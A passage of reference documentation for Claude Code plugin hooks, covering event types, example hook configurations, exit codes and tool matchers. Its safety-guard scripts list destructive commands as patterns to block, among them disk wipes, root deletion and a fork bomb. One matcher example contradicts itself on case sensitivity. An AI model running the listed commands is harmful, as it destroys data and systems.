\"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/init.sh\"\n      }]\n    }]\n  }\n}\n```\n\n### SessionEnd\n\n**Trigger:** When Claude session ends\n\n**Matchers:**\n- `clear` - /clear command\n- `logout` - User logout\n- `prompt_input_exit` - User input exit\n- `other` - Other session termination\n\n**Use Cases:**\n- Cleanup temporary files\n- Persist state\n- Log session summary\n- Notify external systems\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"SessionEnd\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/cleanup.sh\"\n      }]\n    }]\n  }\n}\n```\n\n## Tool Events\n\n### PreToolUse\n\n**Trigger:** Before a tool is invoked\n\n**Matchers:**\n- Tool name: `Bash`, `Write`, `Read`, etc.\n- `*` - All tools\n\n**Use Cases:**\n- Safety checks\n- Input validation\n- Permission gates\n- Logging\n\n**Data Available:**\n- `$ARGUMENTS` - Tool arguments as JSON\n\n**Blocking:** Exit code 2 blocks the tool call\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [{\n      \"matcher\": \"Bash\",\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/bash-guard.sh\",\n        \"timeout\": 30\n      }]\n    }]\n  }\n}\n```\n\n### PostToolUse\n\n**Trigger:** After a tool completes\n\n**Matchers:**\n- Tool name: `Bash`, `Write`, `Read`, etc.\n\n**Use Cases:**\n- Logging tool usage\n- Validating outputs\n- Triggering dependent actions\n- Audit trails\n\n**Data Available:**\n- Tool name and arguments\n- Tool result/exit code\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [{\n      \"matcher\": \"Write\",\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/log-write.sh\"\n      }]\n    }]\n  }\n}\n```\n\n## Interaction Events\n\n### UserPromptSubmit\n\n**Trigger:** When user submits a message\n\n**Use Cases:**\n- Input validation\n- Rate limiting\n- Content filtering\n- Prompt enhancement\n\n**Data Available:**\n- User message content\n- Context state\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"UserPromptSubmit\": [{\n      \"hooks\": [{\n        \"type\": \"prompt\",\n        \"prompt\": \"Check if user input is safe: $ARGUMENTS\",\n        \"timeout\": 30\n      }]\n    }]\n  }\n}\n```\n\n### PermissionRequest\n\n**Trigger:** When permission dialog is shown\n\n**Use Cases:**\n- Auto-allow specific permissions\n- Auto-deny dangerous permissions\n- Log permission requests\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"PermissionRequest\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/permission-guard.sh\"\n      }]\n    }]\n  }\n}\n```\n\n## Notification Events\n\n### Notification\n\n**Trigger:** When Claude Code shows a notification\n\n**Matchers:**\n- `permission_prompt` - Permission dialog\n- `idle_prompt` - Idle notification\n- `auth_success` - Authentication success\n- `elicitation_dialog` - Elicitation dialog\n\n**Use Cases:**\n- Custom notification handling\n- Logging notifications\n- External integrations\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"Notification\": [{\n      \"matchers\": [\"permission_prompt\", \"auth_success\"],\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/notify-logger.sh\"\n      }]\n    }]\n  }\n}\n```\n\n## Completion Events\n\n### Stop\n\n**Trigger:** When main agent finishes\n\n**Use Cases:**\n- Final validation\n- Result reporting\n- State persistence\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"Stop\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/finalize.sh\"\n      }]\n    }]\n  }\n}\n```\n\n### SubagentStop\n\n**Trigger:** When subagent completes\n\n**Use Cases:**\n- Subagent result validation\n- State cleanup\n- Result aggregation\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"SubagentStop\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/subagent-cleanup.sh\"\n      }]\n    }]\n  }\n}\n```\n\n## Compaction Events\n\n### PreCompact\n\n**Trigger:** Before context compaction\n\n**Matchers:**\n- `manual` - Manual compaction trigger\n- `auto` - Automatic compaction\n\n**Use Cases:**\n- Pre-compaction checks\n- State preservation\n- Cache invalidation\n\n**Example:**\n```json\n{\n  \"hooks\": {\n    \"PreCompact\": [{\n      \"matchers\": [\"auto\"],\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/pre-compact-check.sh\"\n      }]\n    }]\n  }\n}\n```\n\n## Event Selection Guide\n\n| Use Case | Best Event | Why |\n|:---------|:-----------|:-----|\n| Environment setup | SessionStart | Runs once when session begins |\n| Cleanup | SessionEnd | Runs before session terminates |\n| Safety checks | PreToolUse | Can block dangerous operations |\n| Logging | PostToolUse | Captures tool results |\n| Input validation | UserPromptSubmit | Filters user input |\n| Final validation | Stop | Runs after agent completes |\n| Subagent cleanup | SubagentStop | Cleans up after subagents |\n",
        "plugins/sys-core/skills/managing-hooks/references/examples.md": "# Working Examples\n\nReal-world hook configurations ready to use.\n\n## Desktop Notifications\n\n### macOS notification when input needed\n```json\n{\n  \"hooks\": {\n    \"Notification\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"osascript -e 'display notification \\\"Claude needs your input\\\" with title \\\"Claude Code\\\" sound name \\\"Glass\\\"'\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Linux notification (notify-send)\n```json\n{\n  \"hooks\": {\n    \"Notification\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"notify-send 'Claude Code' 'Awaiting your input' --urgency=normal\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Play sound on notification\n```json\n{\n  \"hooks\": {\n    \"Notification\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"afplay /System/Library/Sounds/Glass.aiff\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n---\n\n## Logging\n\n### Log all bash commands\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"jq -r '\\\"[\\\" + (.timestamp // now | todate) + \\\"] \\\" + .tool_input.command + \\\" - \\\" + (.tool_input.description // \\\"No description\\\")' >> ~/.claude/bash-log.txt\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Log file operations\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"jq -r '\\\"[\\\" + (now | todate) + \\\"] \\\" + .tool_name + \\\": \\\" + .tool_input.file_path' >> ~/.claude/file-operations.log\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Audit trail for MCP operations\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"mcp__.*\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"jq '. + {timestamp: now}' >> ~/.claude/mcp-audit.jsonl\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n---\n\n## Code Quality\n\n### Auto-format after edits\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"prettier --write \\\"$(echo {} | jq -r '.tool_input.file_path')\\\" 2>/dev/null || true\",\n            \"timeout\": 10000\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Run linter after code changes\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"eslint \\\"$(echo {} | jq -r '.tool_input.file_path')\\\" --fix 2>/dev/null || true\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Run tests before stopping\n```json\n{\n  \"hooks\": {\n    \"Stop\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/check-tests.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`check-tests.sh`:\n```bash\n#!/bin/bash\ncd \"$cwd\" || exit 1\n\n# Run tests\nnpm test > /dev/null 2>&1\n\nif [ $? -eq 0 ]; then\n  echo '{\"decision\": \"approve\", \"reason\": \"All tests passing\"}'\nelse\n  echo '{\"decision\": \"block\", \"reason\": \"Tests are failing. Please fix before stopping.\", \"systemMessage\": \"Run npm test to see failures\"}'\nfi\n```\n\n---\n\n## Safety and Validation\n\n### Block destructive commands\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/check-command-safety.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`check-command-safety.sh`:\n```bash\n#!/bin/bash\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command')\n\n# Check for dangerous patterns\nif [[ \"$command\" == *\"rm -rf /\"* ]] || \\\n   [[ \"$command\" == *\"mkfs\"* ]] || \\\n   [[ \"$command\" == *\"> /dev/sda\"* ]]; then\n  echo '{\"decision\": \"block\", \"reason\": \"Destructive command detected\", \"systemMessage\": \"This command could cause data loss\"}'\n  exit 0\nfi\n\n# Check for force push to main\nif [[ \"$command\" == *\"git push\"*\"--force\"* ]] && \\\n   [[ \"$command\" == *\"main\"* || \"$command\" == *\"master\"* ]]; then\n  echo '{\"decision\": \"block\", \"reason\": \"Force push to main branch blocked\", \"systemMessage\": \"Use a feature branch instead\"}'\n  exit 0\nfi\n\necho '{\"decision\": \"approve\", \"reason\": \"Command is safe\"}'\n```\n\n### Validate commit messages\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Check if this is a git commit command: $ARGUMENTS\\n\\nIf it's a git commit, validate the message follows conventional commits format (feat|fix|docs|refactor|test|chore): description\\n\\nIf invalid format: {\\\"decision\\\": \\\"block\\\", \\\"reason\\\": \\\"Commit message must follow conventional commits\\\"}\\nIf valid or not a commit: {\\\"decision\\\": \\\"approve\\\", \\\"reason\\\": \\\"ok\\\"}\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Block writes to critical files\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/check-protected-files.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`check-protected-files.sh`:\n```bash\n#!/bin/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n\n# Protected files\nprotected_files=(\n  \"package-lock.json\"\n  \".env.production\"\n  \"credentials.json\"\n)\n\nfor protected in \"${protected_files[@]}\"; do\n  if [[ \"$file_path\" == *\"$protected\"* ]]; then\n    echo \"{\\\"decision\\\": \\\"block\\\", \\\"reason\\\": \\\"Cannot modify $protected\\\", \\\"systemMessage\\\": \\\"This file is protected from automated changes\\\"}\"\n    exit 0\n  fi\ndone\n\necho '{\"decision\": \"approve\", \"reason\": \"File is not protected\"}'\n```\n\n---\n\n## Context Injection\n\n### Load sprint context at session start\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/load-sprint-context.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`load-sprint-context.sh`:\n```bash\n#!/bin/bash\n\n# Read sprint info from file\nsprint_info=$(cat \"$CLAUDE_PROJECT_DIR/.sprint-context.txt\" 2>/dev/null || echo \"No sprint context available\")\n\n# Return as SessionStart context\njq -n \\\n  --arg context \"$sprint_info\" \\\n  '{\n    \"hookSpecificOutput\": {\n      \"hookEventName\": \"SessionStart\",\n      \"additionalContext\": $context\n    }\n  }'\n```\n\n### Load git branch context\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"cd \\\"$cwd\\\" && git branch --show-current | jq -Rs '{\\\"hookSpecificOutput\\\": {\\\"hookEventName\\\": \\\"SessionStart\\\", \\\"additionalContext\\\": (\\\"Current branch: \\\" + .)}}'\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Load environment info\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"echo '{\\\"hookSpecificOutput\\\": {\\\"hookEventName\\\": \\\"SessionStart\\\", \\\"additionalContext\\\": \\\"Environment: '$(hostname)'\\\\nNode version: '$(node --version 2>/dev/null || echo 'not installed')'\\\\nPython version: '$(python3 --version 2>/dev/null || echo 'not installed)'\\\"}}'\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n---\n\n## Workflow Automation\n\n### Auto-commit after major changes\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/auto-commit.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`auto-commit.sh`:\n```bash\n#!/bin/bash\ncd \"$cwd\" || exit 1\n\n# Check if there are changes\nif ! git diff --quiet; then\n  git add -A\n  git commit -m \"chore: auto-commit from claude session\" --no-verify\n  echo '{\"systemMessage\": \"Changes auto-committed\"}'\nfi\n```\n\n### Update documentation after code changes\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/update-docs.sh\",\n            \"timeout\": 30000\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Run pre-commit hooks\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/check-pre-commit.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`check-pre-commit.sh`:\n```bash\n#!/bin/bash\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command')\n\n# If git commit, run pre-commit hooks first\nif [[ \"$command\" == *\"git commit\"* ]]; then\n  pre-commit run --all-files > /dev/null 2>&1\n\n  if [ $? -ne 0 ]; then\n    echo '{\"decision\": \"block\", \"reason\": \"Pre-commit hooks failed\", \"systemMessage\": \"Fix formatting/linting issues first\"}'\n    exit 0\n  fi\nfi\n\necho '{\"decision\": \"approve\", \"reason\": \"ok\"}'\n```\n\n---\n\n## Session Management\n\n### Archive transcript on session end\n```json\n{\n  \"hooks\": {\n    \"SessionEnd\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/archive-session.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`archive-session.sh`:\n```bash\n#!/bin/bash\ninput=$(cat)\ntranscript_path=$(echo \"$input\" | jq -r '.transcript_path')\nsession_id=$(echo \"$input\" | jq -r '.session_id')\n\n# Create archive directory\narchive_dir=\"$HOME/.claude/archives\"\nmkdir -p \"$archive_dir\"\n\n# Copy transcript with timestamp\ntimestamp=$(date +%Y%m%d-%H%M%S)\ncp \"$transcript_path\" \"$archive_dir/${timestamp}-${session_id}.jsonl\"\n\necho \"Session archived to $archive_dir\"\n```\n\n### Save session stats\n```json\n{\n  \"hooks\": {\n    \"SessionEnd\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"jq '. + {ended_at: now}' >> ~/.claude/session-stats.jsonl\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n---\n\n## Advanced Patterns\n\n### Intelligent stop logic\n```json\n{\n  \"hooks\": {\n    \"Stop\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Review the conversation: $ARGUMENTS\\n\\nCheck if:\\n1. All user-requested tasks are complete\\n2. Tests are passing (if code changes made)\\n3. No errors that need fixing\\n4. Documentation updated (if applicable)\\n\\nIf incomplete: {\\\"decision\\\": \\\"block\\\", \\\"reason\\\": \\\"specific issue\\\", \\\"systemMessage\\\": \\\"what needs to be done\\\"}\\n\\nIf complete: {\\\"decision\\\": \\\"approve\\\", \\\"reason\\\": \\\"all tasks done\\\"}\\n\\nIMPORTANT: If stop_hook_active is true, return {\\\"decision\\\": undefined} to avoid infinite loop\",\n            \"timeout\": 30000\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Chain multiple hooks\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"echo 'First hook' >> /tmp/hook-chain.log\"\n          },\n          {\n            \"type\": \"command\",\n            \"command\": \"echo 'Second hook' >> /tmp/hook-chain.log\"\n          },\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Final validation: $ARGUMENTS\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nHooks execute in order. First block stops the chain.\n\n### Conditional execution based on file type\n```json\n{\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"/path/to/format-by-type.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n`format-by-type.sh`:\n```bash\n#!/bin/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n\ncase \"$file_path\" in\n  *.js|*.jsx|*.ts|*.tsx)\n    prettier --write \"$file_path\"\n    ;;\n  *.py)\n    black \"$file_path\"\n    ;;\n  *.go)\n    gofmt -w \"$file_path\"\n    ;;\nesac\n```\n\n---\n\n## Project-Specific Hooks\n\nUse `$CLAUDE_PROJECT_DIR` for project-specific hooks:\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"$CLAUDE_PROJECT_DIR/.claude/hooks/init-session.sh\"\n          }\n        ]\n      }\n    ],\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"$CLAUDE_PROJECT_DIR/.claude/hooks/validate-changes.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nThis keeps hook scripts versioned with the project.\n",
        "plugins/sys-core/skills/managing-hooks/references/exit-codes.md": "# Exit Code Protocol\n\n## Overview\n\nCommand hooks communicate results through exit codes. The exit code determines whether the original action proceeds or is blocked.\n\n## Exit Codes\n\n### Exit Code 0: Success (Continue)\n\n**Meaning:** Hook completed successfully, action should proceed.\n\n**Behavior:**\n- Action continues normally\n- No warning logged\n- No interruption\n\n**Use Cases:**\n- Validation passed\n- Safety checks passed\n- Setup completed successfully\n\n**Example:**\n```bash\n#!/bin/bash\n# Validation script - all checks passed\nexit 0\n```\n\n### Exit Code 1: Non-Blocking Warning\n\n**Meaning:** Hook detected a warning, but action should continue.\n\n**Behavior:**\n- Action continues\n- Warning logged to stderr\n- No interruption to user\n\n**Use Cases:**\n- Minor issues detected\n- Configuration inconsistencies\n- Deprecated usage warnings\n\n**Example:**\n```bash\n#!/bin/bash\n# Check for deprecated configuration\nif [ -f old-config.conf ]; then\n  echo \"Warning: old-config.conf is deprecated\" >&2\n  exit 1  # Non-blocking warning\nfi\nexit 0\n```\n\n### Exit Code 2: Blocking Error\n\n**Meaning:** Hook detected a critical issue, action should be blocked.\n\n**Behavior:**\n- **Action is BLOCKED**\n- Only stderr is used as error message\n- JSON in stdout is NOT processed\n- User sees the error message\n\n**Use Cases:**\n- Security violations\n- Missing dependencies\n- Invalid configurations\n- Safety check failures\n\n**Example:**\n```bash\n#!/bin/bash\n# Security check - block dangerous operations\nDANGER_PATTERNS=\"rm -rf / \\..*etc/passwd\"\n\nfor pattern in $DANGER_PATTERNS; do\n  if echo \"$1\" | grep -q \"$pattern\"; then\n    echo \"Error: Dangerous operation detected\" >&2\n    exit 2  # Blocking error\n  fi\ndone\n\nexit 0\n```\n\n## Exit Code Behavior Summary\n\n| Exit Code | Action Continues | User Notified | Stderr Used | Stdout Processed |\n|:---------:|:----------------:|:-------------:|:-----------:|:----------------:|\n| 0 |  |  |  |  |\n| 1 |  |  (warning) |  |  |\n| 2 |  |  (error) |  |  |\n\n## Command Hook Pattern\n\n### Standard Validation Hook\n\n```bash\n#!/bin/bash\n# hooks/validate.sh\n\n# Read tool arguments from stdin\nARGUMENTS=$(cat)\n\n# Run validation\nif ! validate \"$ARGUMENTS\"; then\n  echo \"Validation failed: $REASON\" >&2\n  exit 2\nfi\n\n# Warning example\nif has_minor_issue \"$ARGUMENTS\"; then\n  echo \"Warning: minor issue detected\" >&2\n  exit 1\nfi\n\nexit 0\n```\n\n### Safety Check Hook\n\n```bash\n#!/bin/bash\n# hooks/safety-check.sh\n\nARGUMENTS=$(cat)\n\n# Block dangerous operations\nif is_dangerous \"$ARGUMENTS\"; then\n  echo \"Error: Operation not permitted\" >&2\n  exit 2\nfi\n\nexit 0\n```\n\n### Environment Check Hook\n\n```bash\n#!/bin/bash\n# hooks/env-check.sh\n\n# Check required dependencies\nif ! command -v git &> /dev/null; then\n  echo \"Error: git is required but not installed\" >&2\n  exit 2\nfi\n\n# Warning for optional dependency\nif ! command -v node &> /dev/null; then\n  echo \"Warning: node not found, some features unavailable\" >&2\n  exit 1\nfi\n\nexit 0\n```\n\n## Prompt Hook JSON Protocol\n\nPrompt hooks use a different protocol - they return JSON instead of exit codes.\n\n### Success Response\n\n```json\n{\n  \"ok\": true\n}\n```\n\n**Behavior:** Action continues\n\n### Block Response\n\n```json\n{\n  \"ok\": false,\n  \"reason\": \"Explanation for why the action was blocked\"\n}\n```\n\n**Behavior:** Action is blocked, reason shown to user\n\n## Choosing: Command vs Prompt Hook\n\n| Factor | Command Hook | Prompt Hook |\n|:-------|:-------------|:------------|\n| **Speed** | Fast (script execution) | Slower (LLM evaluation) |\n| **Complexity** | Simple rules | Complex reasoning |\n| **Cost** | No token cost | Consumes tokens |\n| **Use Case** | Safety checks, validation | Semantic evaluation |\n\n**Best Practice:** Use command hooks for fast, rule-based checks. Use prompt hooks only when complex semantic understanding is required.\n\n## Examples\n\n### Command Hook: Block Dangerous Bash Commands\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/bash-guard.sh\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n**bash-guard.sh:**\n```bash\n#!/bin/bash\nARGUMENTS=$(cat)\n\nDANGER_PATTERNS=(\n  \"rm -rf /\"\n  \"rm -rf \\.\\./.*\\.\\./.*\"\n  \"> /etc/\"\n  \":(){ :|:& };:\"  # Fork bomb\n)\n\nfor pattern in \"${DANGER_PATTERNS[@]}\"; do\n  if echo \"$ARGUMENTS\" | grep -q \"$pattern\"; then\n    echo \"Error: Dangerous command pattern detected\" >&2\n    exit 2\n  fi\ndone\n\nexit 0\n```\n\n### Prompt Hook: Semantic Safety Check\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Evaluate if this action is safe: $ARGUMENTS\\n\\nReturn JSON with ok field. If unsafe, set ok to false and include reason field.\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n## Testing Exit Codes\n\n### Test Blocking Behavior\n\n```bash\n# Should block\necho \"rm -rf /\" | ./hooks/bash-guard.sh\necho \"Exit code: $?\"  # Should be 2\n\n# Should pass\necho \"ls -la\" | ./hooks/bash-guard.sh\necho \"Exit code: $?\"  # Should be 0\n```\n\n### Test Warning Behavior\n\n```bash\n# Should warn but continue\n./hooks/env-check.sh\necho \"Exit code: $?\"  # Should be 1\n```\n\n## Validation Checklist\n\n- [ ] Exit code 0 for success (action continues)\n- [ ] Exit code 1 for warnings (action continues, user notified)\n- [ ] Exit code 2 for blocking errors (action blocked)\n- [ ] Error messages written to stderr\n- [ ] Dangerous operations blocked\n- [ ] Timeout configured appropriately\n- [ ] Script has execute permissions\n- [ ] Shebang line present (#!/bin/bash)\n",
        "plugins/sys-core/skills/managing-hooks/references/io-formats.md": "# Input/Output Formats Reference\n\n## Input Format\n\nAll hooks receive JSON via stdin:\n\n```json\n{\n  \"session_id\": \"abc123\",\n  \"transcript_path\": \"/path/to/transcript.txt\",\n  \"cwd\": \"/current/working/directory\",\n  \"permission_mode\": \"ask|allow|bypass\",\n  \"hook_event_name\": \"PreToolUse\",\n  \"tool_name\": \"Write\",\n  \"tool_input\": {\n    \"file_path\": \"/path/to/file\",\n    \"content\": \"file content\"\n  }\n}\n```\n\n### Event-Specific Fields\n\n**PreToolUse:**\n- `tool_name`: Name of the tool being used\n- `tool_input`: Tool-specific input data\n\n**PostToolUse:**\n- `tool_name`: Name of the tool used\n- `tool_input`: Tool input data\n- `tool_output`: Tool output data\n- `duration_ms`: Execution time\n\n**Stop:**\n- `reason`: Stop reason\n- `completed`: Boolean completion status\n\n## Output Format\n\nAll hooks must output JSON:\n\n```json\n{\n  \"continue\": true,\n  \"suppressOutput\": false,\n  \"systemMessage\": \"Message for Claude\"\n}\n```\n\n### Output Fields\n\n- **continue:** Boolean - Whether to proceed\n- **suppressOutput:** Boolean - Hide stdout from Claude\n- **systemMessage:** String - Message to display\n\n## Exit Codes\n\n- **0** - Success, continue, show stdout\n- **1** - Non-blocking error, continue, log stderr\n- **2** - Blocking error, halt operation\n- **124** - Timeout\n\n## Environment Variables\n\nAvailable in command hooks:\n\n- `$CLAUDE_PROJECT_DIR` - Project root\n- `$CLAUDE_PLUGIN_ROOT` - Plugin directory\n- `$CLAUDE_ENV_FILE` - SessionStart only\n- `$CLAUDE_CODE_REMOTE` - Remote execution flag\n",
        "plugins/sys-core/skills/managing-hooks/references/matchers.md": "# Matchers and Pattern Matching\n\nComplete guide to matching tools with hook matchers.\n\n## What are matchers?\n\nMatchers are regex patterns that filter which tools trigger a hook. They allow you to:\n- Target specific tools (e.g., only `Bash`)\n- Match multiple tools (e.g., `Write|Edit`)\n- Match tool categories (e.g., all MCP tools)\n- Match everything (omit matcher)\n\n---\n\n## Syntax\n\nMatchers use JavaScript regex syntax:\n\n```json\n{\n  \"matcher\": \"pattern\"\n}\n```\n\nThe pattern is tested against the tool name using `new RegExp(pattern).test(toolName)`.\n\n---\n\n## Common Patterns\n\n### Exact match\n```json\n{\n  \"matcher\": \"Bash\"\n}\n```\nMatches: `Bash`\nDoesn't match: `bash`, `BashOutput`\n\n### Multiple tools (OR)\n```json\n{\n  \"matcher\": \"Write|Edit\"\n}\n```\nMatches: `Write`, `Edit`\nDoesn't match: `Read`, `Bash`\n\n### Starts with\n```json\n{\n  \"matcher\": \"^Bash\"\n}\n```\nMatches: `Bash`, `BashOutput`\nDoesn't match: `Read`\n\n### Ends with\n```json\n{\n  \"matcher\": \"Output$\"\n}\n```\nMatches: `BashOutput`\nDoesn't match: `Bash`, `Read`\n\n### Contains\n```json\n{\n  \"matcher\": \".*write.*\"\n}\n```\nMatches: `Write`, `NotebookWrite`, `TodoWrite`\nDoesn't match: `Read`, `Edit`\n\nCase-sensitive! `write` won't match `Write`.\n\n### Any tool (no matcher)\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"hooks\": [...]  // No matcher = matches all tools\n      }\n    ]\n  }\n}\n```\n\n---\n\n## Tool Categories\n\n### All file operations\n```json\n{\n  \"matcher\": \"Read|Write|Edit|Glob|Grep\"\n}\n```\n\n### All bash tools\n```json\n{\n  \"matcher\": \"Bash.*\"\n}\n```\nMatches: `Bash`, `BashOutput`, `BashKill`\n\n### All MCP tools\n```json\n{\n  \"matcher\": \"mcp__.*\"\n}\n```\nMatches: `mcp__memory__store`, `mcp__filesystem__read`, etc.\n\n### Specific MCP server\n```json\n{\n  \"matcher\": \"mcp__memory__.*\"\n}\n```\nMatches: `mcp__memory__store`, `mcp__memory__retrieve`\nDoesn't match: `mcp__filesystem__read`\n\n### Specific MCP tool\n```json\n{\n  \"matcher\": \"mcp__.*__write.*\"\n}\n```\nMatches: `mcp__filesystem__write`, `mcp__memory__write`\nDoesn't match: `mcp__filesystem__read`\n\n---\n\n## MCP Tool Naming\n\nMCP tools follow the pattern: `mcp__{server}__{tool}`\n\nExamples:\n- `mcp__memory__store`\n- `mcp__filesystem__read`\n- `mcp__github__create_issue`\n\n**Match all tools from a server**:\n```json\n{\n  \"matcher\": \"mcp__github__.*\"\n}\n```\n\n**Match specific tool across all servers**:\n```json\n{\n  \"matcher\": \"mcp__.*__read.*\"\n}\n```\n\n---\n\n## Real-World Examples\n\n### Log all bash commands\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n     